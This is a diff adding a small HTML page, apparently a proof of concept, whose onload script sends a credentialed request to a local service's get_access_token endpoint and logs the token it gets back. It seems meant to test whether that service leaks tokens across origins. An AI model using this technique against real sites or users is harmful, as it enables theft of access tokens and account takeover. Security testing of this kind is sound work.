@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hacker Page</title>
+</head>
+
+<body onload="hack()">
+    <p style="text-align: center;">Haha stealing your access token.</p>
+
+</body>
+
+<script>
+    async function hack() {
+        console.log("Hacking...");
+        const response = await fetch('http://127.0.0.1:9090/get_access_token', {
+            method: 'GET',
+            credentials: "include"
+        });
+        console.log(await response.json());
+    }
+</script>
+
+</html>
